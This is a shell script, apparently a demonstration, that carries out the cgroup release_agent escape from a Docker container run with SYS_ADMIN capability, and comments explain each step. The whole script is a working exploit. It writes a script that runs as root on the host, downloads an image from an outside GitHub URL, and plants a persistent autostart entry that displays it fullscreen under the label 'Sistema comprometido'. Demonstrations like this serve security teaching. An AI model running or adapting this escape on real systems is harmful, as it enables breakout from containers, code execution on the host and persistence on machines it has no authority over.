#!/bin/sh
# Download/save a image to the host system and open it
# Source: https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
# Goal: Trigger the release_agent, by killing all processes in a cgroup
# Run on Host:
# docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# First we mount a cgroup contoller to a new folder '/mnt/cgrp' and create a child cgroup
# We mount the rdma controller and create a child cgroup by creating the subfolder '/tmp/cgrp/x'
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# We enable cgroup notification on release for the x cgroup.
# This is done, by writing a 1 to the notify_on_release file of x.
echo 1 > /tmp/cgrp/x/notify_on_release

# We grab the containers path on the host from the '/etc/mtab' file (upperdir=) and store it in host_path.
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# We tell the RDMA cgroup release agent to execute the '/cmd' script.
# This is done by writing the path to the script file to the release_agent file.
# The agent is executed on the host, so we need to add the host_path of the container.
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# We create our sriptfile ('/cmd') and make it executable.
echo '#!/bin/sh' > /cmd
echo 'curl https://raw.githubusercontent.com/SgtMate/container_escape_showcase/main/cgroup_release_exploit/sombra.gif -o /hack.gif' >> /cmd
echo 'chmod 744 /hack.gif' >> /cmd
echo 'touch /etc/xdg/autostart/hack.desktop' >> /cmd
echo 'echo "[Desktop Entry]" > /etc/xdg/autostart/hack.desktop' >> /cmd
echo 'echo "Type=Application" >> /etc/xdg/autostart/hack.desktop' >> /cmd
echo 'echo "Name=Apagando las luces" >> /etc/xdg/autostart/hack.desktop' >> /cmd
echo 'echo "Comment=Sistema comprometido" >> /etc/xdg/autostart/hack.desktop' >> /cmd
echo 'echo "Exec=/usr/bin/eog --fullscreen /hack.gif" >> /etc/xdg/autostart/hack.desktop' >> /cmd
echo 'echo "NoDisplay=true" >> /etc/xdg/autostart/hack.desktop' >> /cmd
chmod a+x /cmd

# Finally, we can execute the attack by spawning aprocess, that immediatly ends inside the x child cgroup.
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
